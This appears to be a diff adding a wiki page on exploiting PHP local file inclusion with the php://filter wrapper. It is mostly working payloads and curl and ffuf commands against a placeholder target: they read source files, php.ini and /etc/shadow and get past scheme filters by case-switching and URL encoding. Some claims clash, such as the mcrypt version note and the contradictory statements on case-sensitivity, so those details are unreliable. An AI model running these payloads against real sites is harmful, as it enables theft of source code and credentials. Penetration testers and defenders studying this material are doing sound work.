@@ -1,0 +1,295 @@
+---
+title: PHP filters
+description: Using php://filter to read PHP source code that would otherwise be executed - base64 encoding the file contents before they reach the renderer.
+mitre: [T1190, T1083]
+d3fend: [D3-FA]
+impact: [FileRead]
+owasp: [A03]
+sidebar:
+  order: 4
+  label: PHP filters
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+When the LFI sink executes PHP files (rather than reading them), including `config.php` runs it - you get the rendered output, not the source. The `php://filter` wrapper transforms the file contents before they reach the renderer, letting you base64-encode the source and read it.
+
+```
+# Read source of config.php - base64-encoded, won't execute as PHP
+?page=php://filter/convert.base64-encode/resource=config
+
+# Decode the response
+echo 'PD9waHAK...' | base64 -d
+
+# Other useful filters
+?page=php://filter/convert.iconv.utf-8.utf-16/resource=config             # corrupts the PHP so it can't execute
+?page=php://filter/string.rot13/resource=config                          # ROT13 the source
+?page=php://filter/zlib.deflate/convert.base64-encode/resource=config    # compress + b64 for big files
+```
+
+Success indicator: a base64 string in the response that decodes to PHP source code.
+
+## Why this is needed
+
+The vulnerable function determines what happens when you include a file:
+
+| Function | Behavior on `?page=config.php` |
+| --- | --- |
+| `include()`, `require()` | Executes the PHP - you see rendered HTML, not source |
+| `file_get_contents()` | Returns raw bytes - source visible directly |
+| `readfile()` | Returns raw bytes - source visible directly |
+| `fopen()` + read | Returns raw bytes - source visible directly |
+
+When the function executes, asking for `config.php` runs the file. If the config file just sets variables and doesn't echo anything, the response is empty. If it echoes a welcome message, you see that - but never the source code itself.
+
+The PHP filter wrapper interposes a transformation on the bytes between the file read and the executor. By base64-encoding the bytes, the result is no longer valid PHP - the executor sees a string like `PD9waHAK...` (just text), so it can't execute, but the bytes are reflected to the response.
+
+## The base64 filter
+
+```
+?page=php://filter/convert.base64-encode/resource=config
+```
+
+Three parts:
+
+- `php://filter/` - invoke the filter wrapper
+- `convert.base64-encode/` - the transformation to apply
+- `resource=config` - the file to read (no extension; the app appends `.php`)
+
+Submit, capture the response, locate the base64 chunk (often surrounded by the page's normal HTML), decode:
+
+```bash
+curl -s "https://target.example.com/?page=php://filter/convert.base64-encode/resource=config" \
+    | grep -oE '[A-Za-z0-9+/=]{40,}' \
+    | base64 -d
+```
+
+The `grep` extracts the base64 chunk (40+ chars of base64 alphabet). Adjust based on where the response renders the encoded bytes.
+
+### When the app appends `.php`
+
+The append happens after your input is parsed. So `php://filter/.../resource=config` becomes `php://filter/.../resource=config.php` - which is exactly what you want. The appended extension actually helps in this case.
+
+### When the app has a path prefix
+
+```php
+include("./pages/" . $_GET['page']);
+```
+
+Becomes `./pages/php://filter/.../resource=config` - invalid because of the prefix. Use `../` to escape the prefix first:
+
+```
+?page=../../php://filter/convert.base64-encode/resource=config
+```
+
+PHP resolves the path: the `../../` walks out of `./pages/`, then `php://filter/...` is interpreted as a wrapper URL. Specific path depth varies.
+
+This doesn't always work - some PHP setups normalize the path before checking for wrapper schemes. When the prefix is `./pages/` and the wrapper string is "inside" the prefix, the resolver might reject it. Test and adjust.
+
+## Reading non-PHP files
+
+`php://filter` works on any file, not just PHP. For non-executable files (config, logs), the wrapper is just an obfuscation - you could read them directly. But the filter form is sometimes useful:
+
+```
+# Read .ini files (would render as HTML if returned directly)
+?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini
+
+# Read binary files without corruption
+?page=php://filter/convert.base64-encode/resource=/var/www/html/logo.png
+
+# Read files containing characters that break the HTML response
+?page=php://filter/convert.base64-encode/resource=/etc/shadow
+```
+
+Base64 makes binary content survive the HTML rendering layer without escaping or stripping. Useful when the application's renderer mangles raw bytes.
+
+## Reading the PHP config
+
+A particularly valuable target - the PHP configuration file. Reveals what wrappers are enabled, security policies, extension availability:
+
+```
+?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini
+```
+
+Try common paths:
+
+```
+/etc/php/7.4/apache2/php.ini                 # Apache + PHP 7.4 on Debian/Ubuntu
+/etc/php/8.1/apache2/php.ini
+/etc/php/7.4/fpm/php.ini                     # FPM (Nginx + PHP-FPM)
+/etc/php/8.1/fpm/php.ini
+/etc/php.ini                                 # CentOS/RHEL
+/usr/local/etc/php/php.ini                   # FreeBSD, some Docker images
+/opt/lampp/etc/php.ini                       # XAMPP
+C:\xampp\php\php.ini                         # XAMPP on Windows
+```
+
+Once you have the config, grep for the values that matter:
+
+```bash
+echo "$BASE64" | base64 -d | grep -E '^(allow_url_include|allow_url_fopen|open_basedir|disable_functions|extension)'
+```
+
+Key settings:
+
+| Setting | What enabling means |
+| --- | --- |
+| `allow_url_include = On` | RFI and `data://`, `php://input` wrappers work |
+| `allow_url_fopen = On` | Functions like `file_get_contents` accept remote URLs |
+| `open_basedir = /var/www` | LFI restricted to that directory tree (escape paths) |
+| `disable_functions = ...` | Specific functions blocked - affects post-RCE escape paths |
+| `extension=expect` | `expect://` wrapper is loaded → expect attack works |
+| `extension=zip` | `zip://` wrapper enabled → can use [file-upload zip chain](/codex/web/lfi/file-upload-chain/) |
+
+This single file tells you most of what's possible with the LFI before you start trying attacks. Read it first when you have working `php://filter` access.
+
+## Finding PHP files to read
+
+You need to know the filename to read its source. Two approaches:
+
+### Fuzzing
+
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
+     -u "https://target.example.com/FUZZ.php" \
+     -mc 200,302,403
+```
+
+Hit on any of these = a file exists and is being served. The 302 and 403 cases are still useful - you can read the file via LFI even if direct access is blocked.
+
+### Following references
+
+Start with `index.php`, read its source, look for `include(...)`, `require(...)`, `class ... extends`, and similar references. Read those next. Recurse.
+
+```bash
+# Get the source of index.php
+TOKEN=$(curl -s "https://target.example.com/?page=php://filter/convert.base64-encode/resource=index" | grep -oE '[A-Za-z0-9+/=]{40,}')
+echo "$TOKEN" | base64 -d > /tmp/index.php.src
+
+# Find references
+grep -E "(include|require)[^a-z]" /tmp/index.php.src
+grep -E "['\"][a-zA-Z_/-]+\.php['\"]" /tmp/index.php.src
+```
+
+After reading several files, the application's structure becomes clear. Look for:
+
+- Database connection setup → `config.php`, `db.php`, `connection.php`
+- Authentication logic → `auth.php`, `login.php`, `session.php`
+- Admin functionality → `admin/index.php`, `admin/users.php`
+- API endpoints → `api/v1/*.php`, `endpoints.php`
+
+## Other filter types
+
+The base64 filter is the workhorse. A few others are occasionally useful:
+
+### String filters
+
+```
+?page=php://filter/string.rot13/resource=config
+?page=php://filter/string.strip_tags/resource=config
+?page=php://filter/string.toupper/resource=config
+```
+
+`string.rot13` is sometimes used to bypass filters that look for PHP tags (`<?php`) in the input.
+
+### Conversion filters
+
+```
+?page=php://filter/convert.iconv.utf-8.utf-16/resource=config
+?page=php://filter/convert.iconv.utf-8.utf-7/resource=config
+?page=php://filter/convert.quoted-printable-encode/resource=config
+```
+
+`iconv.utf-8.utf-16` converts the source to UTF-16, which makes the PHP code unparseable - same effect as base64 (prevents execution), readable in the response. UTF-7 has its own use case for XSS via inclusion but rare in LFI.
+
+### Compression filters
+
+```
+?page=php://filter/zlib.deflate/convert.base64-encode/resource=large_file
+```
+
+Chains compress + base64 in one shot. Useful when files are large enough that the base64 response gets truncated by the application or proxy.
+
+### Encryption filters (PHP ≥7.0)
+
+```
+?page=php://filter/mcrypt.rijndael-128.encode.SECRET/resource=config
+```
+
+Encrypts the content with a specified key. Mostly used by attackers trying to obfuscate exfiltrated content from monitoring - not commonly useful for the operator who just wants to read source.
+
+## Chaining filters
+
+The pipe character chains filters left to right:
+
+```
+?page=php://filter/zlib.deflate|convert.base64-encode/resource=...
+```
+
+Equivalent to applying `zlib.deflate` first, then `base64-encode`. Decode in reverse:
+
+```bash
+echo "$TOKEN" | base64 -d | zlib-flate -uncompress    # need zlib-flate or python zlib
+```
+
+Python helper:
+
+```python
+import base64, zlib
+with open('encoded.txt') as f:
+    data = base64.b64decode(f.read())
+print(zlib.decompress(data, -15).decode())
+```
+
+## When `php://filter` is blocked
+
+Some applications filter the `php://` scheme outright. A few workarounds:
+
+```
+# Case manipulation (sometimes bypasses case-sensitive filters)
+?page=PHP://filter/convert.base64-encode/resource=config
+
+# URL encoding the colon
+?page=php%3a//filter/convert.base64-encode/resource=config
+
+# Double-encoding
+?page=php%253a%252f%252ffilter%252fconvert.base64-encode%252fresource=config
+```
+
+If the scheme is genuinely blocked, source disclosure via this path is closed. Move to [file-upload chain](/codex/web/lfi/file-upload-chain/) or [log poisoning](/codex/web/lfi/log-poisoning/) if RCE is the goal - those don't need source disclosure.
+
+## Detection-only checks
+
+Probes that confirm `php://filter` is reachable without reading anything sensitive:
+
+```bash
+# Read index.php source (you can see it rendered anyway)
+curl -s "https://target.example.com/?page=php://filter/convert.base64-encode/resource=index" \
+    | grep -oE '[A-Za-z0-9+/=]{40,}' \
+    | head -c 60
+
+# A response containing a long base64 chunk = filter works
+# No base64 chunk = filter blocked or path/extension wrong
+```
+
+## PHP 7.4+ behavior changes
+
+A few quirks to know about modern PHP:
+
+- **`php://filter` requires `allow_url_include`?** No - `php://filter` is exempt from this restriction even on hardened servers. It's the most reliable LFI wrapper because of this.
+- **`allow_url_fopen = Off` doesn't block `php://filter`.** Same reason - local file access through wrappers is treated separately.
+- **`open_basedir` does restrict `php://filter`.** When `open_basedir = /var/www`, you can't `resource=/etc/passwd`. The wrapper checks against the basedir like any other file access.
+
+The bypass when `open_basedir` is set: read whatever's inside the basedir (app source, often valuable on its own) and look for credentials, then pivot.
+
+## Notes
+
+- **`php://filter` is the highest-yield LFI primitive on PHP apps.** It survives most filter configurations, doesn't require `allow_url_include`, and works on the file types the operator cares about. Always try it before assuming source disclosure is closed.
+- **The base64 chunk is sometimes split across the response.** When the response includes the encoded data inside `<pre>` tags or a `<textarea>`, the chunk is contiguous. When it's interpolated into multiple places, you may have to concatenate fragments by hand.
+- **Source code is information disclosure with compound value.** Reading source reveals other bugs (SQLi sinks, command injection, hardcoded credentials, hidden endpoints) that you can then exploit through different channels. Source disclosure via LFI often leads to RCE via SQLi found in the source, not through the LFI itself.
+- **The wrapper string is case-sensitive but the filter names sometimes aren't.** `php://filter/...` (lowercase) is required; the filter name (`convert.base64-encode`) sometimes accepts variants like `CONVERT.BASE64-ENCODE` depending on the PHP version. Try if the lowercase version fails.
+
+<Aside type="tip">
+The single most valuable file to read via `php://filter` is the PHP configuration (`php.ini`). It tells you which wrappers work, what's restricted, and where logs are written - answering a dozen questions about the target in one read.
+</Aside>
